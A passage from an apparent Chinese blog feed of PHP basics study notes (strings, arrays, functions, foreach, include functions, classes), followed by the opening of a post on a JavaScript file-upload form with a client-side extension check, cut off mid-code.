title="字符串大小写转换"></a>字符串大小写转换</h3><ul><li>strtoupper()：全部转为大写</li><li>strtolower()：全部转为小写</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;Hello World&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$str</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strtolower</span>(<span class="variable">$str</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718375234078-245052ec-17b5-46d7-83a0-da2a33b67739.png"></p><h3 id="strpos-字符串查找"><a href="#strpos-字符串查找" class="headerlink" title="strpos()字符串查找"></a>strpos()字符串查找</h3><p>用于字符串内查找一个字符或者一段指定的文本。如果在字符串中能匹配上，该函数会返回第一个匹配的字符位置，如果未匹配到，则返回FALSE</p><blockquote><p>字符串中首字符的位置是 0 而不是 1</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;hello world&quot;</span>;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>,<span class="string">&#x27;world&#x27;</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//h为0，往后依次递增</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718375516943-708dc148-d2c6-4680-9a73-5d7fe3a6f132.png"></p><h3 id="str-replace-字符串替换"><a href="#str-replace-字符串替换" class="headerlink" title="str_replace()字符串替换"></a>str_replace()字符串替换</h3><p>用一些字符串替换字符串中的另一些字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;world&quot;</span>, <span class="string">&quot;Kitty&quot;</span>, <span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//str_replace(原字符，替换后的字符，字符串)</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718375717847-c6da43b0-3fed-4255-9c80-fffb9715b9b6.png"></p><h3 id="对字符串中的单词计数"><a href="#对字符串中的单词计数" class="headerlink" title="对字符串中的单词计数"></a>对字符串中的单词计数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">str_word_count</span>(<span class="string">&quot;Hello world!&quot;</span>); <span class="comment">// 输出 2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718377009290-c58ec109-2692-4be8-bcdb-dfbea705809a.png"></p><h1 id="数字处理"><a href="#数字处理" class="headerlink" title="数字处理"></a>数字处理</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="number">12</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$x</span>+<span class="subst">$y</span>=&quot;</span>.(<span class="variable">$x</span>+<span class="variable">$y</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$x</span>-<span class="subst">$y</span>=&quot;</span>.(<span class="variable">$x</span>-<span class="variable">$y</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$x</span>*<span class="subst">$y</span>=&quot;</span>.(<span class="variable">$x</span>*<span class="variable">$y</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$x</span>/<span class="subst">$y</span>=&quot;</span>.(<span class="variable">$x</span>/<span class="variable">$y</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$x</span>%<span class="subst">$y</span>=&quot;</span>.(<span class="variable">$x</span>%<span class="variable">$y</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718375811308-db26582e-9eb3-4e23-b578-9641352f4e3d.png"></p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718375977560-3ba8aa96-219c-46c8-9c1b-169e4043a239.png"></p><h2 id="递增-递减运算符"><a href="#递增-递减运算符" class="headerlink" title="递增&#x2F;递减运算符"></a>递增&#x2F;递减运算符</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718375940100-fb59442d-ff6a-4ad0-93b9-a362e3cd82d8.png"></p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>Array，在单个变量中存储多个值的特殊变量</p><p>php中的三种数组</p><ul><li>索引数组（数值数组） - 带有数字索引的数组</li><li>关联数组 - 带有指定键的数组</li><li>多维数组 - 包含一个或多个数组的数组</li></ul><h2 id="数值（索引）数组"><a href="#数值（索引）数组" class="headerlink" title="数值（索引）数组"></a>数值（索引）数组</h2><h3 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h3><ul><li>自动分配 ID 键（ID 键总是从 0 开始）：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>人工分配 ID 键：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cars</span>[<span class="number">0</span>]=<span class="string">&quot;Volvo&quot;</span>;</span><br><span class="line"><span class="variable">$cars</span>[<span class="number">1</span>]=<span class="string">&quot;BMW&quot;</span>;</span><br><span class="line"><span class="variable">$cars</span>[<span class="number">2</span>]=<span class="string">&quot;Toyota&quot;</span>;</span><br></pre></td></tr></table></figure><p>创建空数组</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure><p>创建数组时就对数组赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fruits</span> = [<span class="string">&#x27;apple&#x27;</span>,<span class="string">&#x27;orange&#x27;</span>,<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="variable">$fruits</span> = <span class="keyword">array</span>(<span class="string">&#x27;apple&#x27;</span>,<span class="string">&#x27;orange&#x27;</span>,<span class="string">&#x27;banana&#x27;</span>);</span><br></pre></td></tr></table></figure><p>数组元素的类型可以不一样</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span>=[<span class="number">1</span>,<span class="string">&#x27;test&#x27;</span>];</span><br></pre></td></tr></table></figure><h3 id="使用数组"><a href="#使用数组" class="headerlink" title="使用数组"></a>使用数组</h3><h4 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&#x27;apple&#x27;</span>,<span class="string">&#x27;orange&#x27;</span>,<span class="string">&#x27;banana&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;my favorite fruit is <span class="subst">$arr</span>[0] &quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718378018065-e67ba6fb-b1b5-4344-b4e8-6e3f5046124b.png"></p><h4 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&#x27;apple&#x27;</span>,<span class="string">&#x27;orange&#x27;</span>,<span class="string">&#x27;banana&#x27;</span>);</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$arr</span>[]=<span class="string">&#x27;cherry&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718378000812-a229def0-f3bd-4681-ad2d-5125317679db.png"></p><h4 id="count-获取数组长度"><a href="#count-获取数组长度" class="headerlink" title="count()获取数组长度"></a>count()获取数组长度</h4><p>count() 函数用于返回数组的长度（元素数）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;porsche&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Volvo&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718378178333-cdd83a4f-7716-49c9-b09d-518eacd281d5.png"></p><h4 id="in-array-查询数组是否包含某个元素"><a href="#in-array-查询数组是否包含某个元素" class="headerlink" title="in_array()查询数组是否包含某个元素"></a>in_array()查询数组是否包含某个元素</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;apple&#x27;</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;apple in array.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718378371395-48405941-5291-4963-b402-ffbf5fd8bdfa.png"></p><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;apple&quot;</span>,<span class="string">&quot;orange&quot;</span>,<span class="string">&quot;banana&quot;</span>);</span><br><span class="line">  <span class="variable">$arrlength</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$cars</span>[<span class="variable">$x</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718378526384-8318d44f-8d70-4f5e-9cfc-8d09d3ecfd6f.png"></p><h2 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h2><p>关联数组是使用您分配给数组的指定的键的数组</p><h3 id="创建方式-1"><a href="#创建方式-1" class="headerlink" title="创建方式"></a>创建方式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Steve&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Elon&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Bill&#x27;</span>]=<span class="string">&quot;63&quot;</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Steve&#x27;</span>]=<span class="string">&quot;56&quot;</span>;</span><br><span class="line"><span class="variable">$age</span>[<span class="string">&#x27;Elon&#x27;</span>]=<span class="string">&quot;47&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="获取元素-1"><a href="#获取元素-1" class="headerlink" title="获取元素"></a>获取元素</h3><p>关联数组相当于索引数组中的索引被替换为我们所分配的键值，我们可以通过键值来取到数组中的元素</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>=&gt;<span class="string">&quot;63&quot;</span>,<span class="string">&quot;Steve&quot;</span>=&gt;<span class="string">&quot;56&quot;</span>,<span class="string">&quot;Elon&quot;</span>=&gt;<span class="string">&quot;47&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Elon is &quot;</span> . <span class="variable">$age</span>[<span class="string">&#x27;Elon&#x27;</span>] . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39123326/1718379016050-aeecfc9c-7fc3-495e-ac07-a8d413d9e79a.png"></p><h3 id="遍历-1"><a href="#遍历-1" class="headerlink" title="遍历"></a>遍历</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>=&gt;<span class="string">&quot;63&quot;</span>,<span class="string">&quot;Steve&quot;</span>=&gt;<span class="string">&quot;56&quot;</span>,<span class="string">&quot;Elon&quot;</span>=&gt;<span class="string">&quot;47&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$age</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$x_value</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Key=&quot;</span> . <span class="variable">$x</span> . <span class="string">&quot;, Value=&quot;</span> . <span class="variable">$x_value</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>php函数</p><ul><li>内置函数</li><li>用户自定义函数</li></ul><h2 id="创建用户自定义函数"><a href="#创建用户自定义函数" class="headerlink" title="创建用户自定义函数"></a>创建用户自定义函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  被执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>函数名能够以字母或下划线开头（而非数字）。</p><p>函数名对大小写不敏感。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sayhi</span>(); <span class="comment">// 调用函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>参数在括号内部，有多个参数时直接用逗号隔开</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">familyName</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$year</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$fname</span> Zhang. Born in <span class="subst">$year</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">familyName</span>(<span class="string">&quot;Li&quot;</span>,<span class="string">&quot;1975&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">familyName</span>(<span class="string">&quot;Hong&quot;</span>,<span class="string">&quot;1978&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">familyName</span>(<span class="string">&quot;Tao&quot;</span>,<span class="string">&quot;1983&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>设置默认参数值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setHeight</span>(<span class="params"><span class="variable">$minheight</span>=<span class="number">50</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;The height is : <span class="subst">$minheight</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setHeight</span>(<span class="number">350</span>);</span><br><span class="line"><span class="title function_ invoke__">setHeight</span>(); <span class="comment">// 将使用默认值 50</span></span><br><span class="line"><span class="title function_ invoke__">setHeight</span>(<span class="number">135</span>);</span><br><span class="line"><span class="title function_ invoke__">setHeight</span>(<span class="number">80</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$z</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;5 + 10 = &quot;</span> . <span class="title function_ invoke__">sum</span>(<span class="number">5</span>,<span class="number">10</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;7 + 13 = &quot;</span> . <span class="title function_ invoke__">sum</span>(<span class="number">7</span>,<span class="number">13</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;2 + 4 = &quot;</span> . <span class="title function_ invoke__">sum</span>(<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><p>同C，JS一样</p><h2 id="foreach遍历数组"><a href="#foreach遍历数组" class="headerlink" title="foreach遍历数组"></a>foreach遍历数组</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</span></span><br><span class="line">例子</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="variable">$grades</span> = <span class="keyword">array</span>(<span class="string">&quot;张三&quot;</span>=&gt;<span class="number">90</span>,<span class="string">&quot;李四&quot;</span>=&gt;<span class="number">85</span>,<span class="string">&quot;小明&quot;</span>=&gt;<span class="number">50</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$grades</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$value</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</span></span><br><span class="line">例子</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>); <span class="comment">// 设置编码格式  </span></span><br><span class="line">    <span class="variable">$grades</span> = <span class="keyword">array</span>(<span class="string">&quot;张三&quot;</span>=&gt;<span class="number">90</span>,<span class="string">&quot;李四&quot;</span>=&gt;<span class="number">85</span>,<span class="string">&quot;小明&quot;</span>=&gt;<span class="number">50</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$grades</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$key</span> =&gt; <span class="subst">$value</span>&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>php使用文件包含来调用文件</p><h2 id="php文件包含函数"><a href="#php文件包含函数" class="headerlink" title="php文件包含函数"></a>php文件包含函数</h2><p><a href="https://blog.csdn.net/weixin_38676357/article/details/81673986">PHP包含文件函数include、include_once、require、require_once区别和总结-CSDN博客</a></p><ol><li>include()</li></ol><p>当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p><ol start="2"><li>include_once()</li></ol><p>功能与include()相同，区别在于当重复调用同一文件时，程序只调用一次。</p><ol start="3"><li>require()</li></ol><p>require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。</p><ol start="4"><li>require_once()</li></ol><p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><h2 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h2><p>创建对象之前要先定义对应的类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_name</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$var1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$var2</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc1</span> (<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">     code;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>类使用class关键字后加上类名定义。</p><p>类名后的一对大括号{}内可以定义属性和方法。</p><p>类的属性使用var来声明，属性也可以初始化值。</p><p>方法定义类似PHP函数的定义，但类方法只能通过该类及其实例化的对象访问。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;  </span><br><span class="line">    <span class="comment">// 声明属性  </span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$age</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明方法  </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello, my friend!\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;My name is <span class="subst">$this</span>-&gt;name, my age is <span class="subst">$this</span>-&gt;age&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="创建和使用对象"><a href="#创建和使用对象" class="headerlink" title="创建和使用对象"></a>创建和使用对象</h2><p>类创建后，使用new运算符来实例化该类的对象</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例化对象  </span></span><br><span class="line"><span class="variable">$han</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br></pre></td></tr></table></figure><p>访问对象属性和方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象属性赋值  </span></span><br><span class="line"><span class="variable">$han</span>-&gt;name = <span class="string">&quot;han&quot;</span>;  </span><br><span class="line"><span class="variable">$han</span>-&gt;age = <span class="number">18</span>;  </span><br><span class="line"><span class="comment">// 对象调用方法  </span></span><br><span class="line"><span class="variable">$han</span>-&gt;<span class="title function_ invoke__">hello</span>();</span><br></pre></td></tr></table></figure><h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">将赋值的id传给id变量，如果为空，则id=<span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS应用</title>
      <link href="/2025/05/27/JS%E5%BA%94%E7%94%A8/"/>
      <url>/2025/05/27/JS%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="原生JS文件上传"><a href="#原生JS文件上传" class="headerlink" title="原生JS文件上传"></a>原生JS文件上传</h1><h2 id="JS实现文件上传"><a href="#JS实现文件上传" class="headerlink" title="JS实现文件上传"></a>JS实现文件上传</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- 表单用于文件上传，指定了上传的目标地址为 <span class="string">&quot;upload.php&quot;</span>，使用 POST 方法提交，并设置 enctype 为 <span class="string">&quot;multipart/form-data&quot;</span> --&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;!-- 为文件上传输入框添加标签 --&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;选择文件:&lt;/label&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 这是一个包含文件上传输入框的 HTML 代码，并且在用户选择文件时触发 CheckFileExt 函数 --&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;f&quot;</span> onchange=<span class="string">&quot;CheckFileExt(this.value)&quot;</span>&gt;<span class="comment">//改变时，触发cheakfileext函数</span></span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 提交按钮 --&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;上传文件&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="comment">// JavaScript 函数 CheckFileExt 用于检查文件后缀名</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">CheckFileExt</span>(<span class="params">filename</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> flag = <span class="literal">false</span>;<span 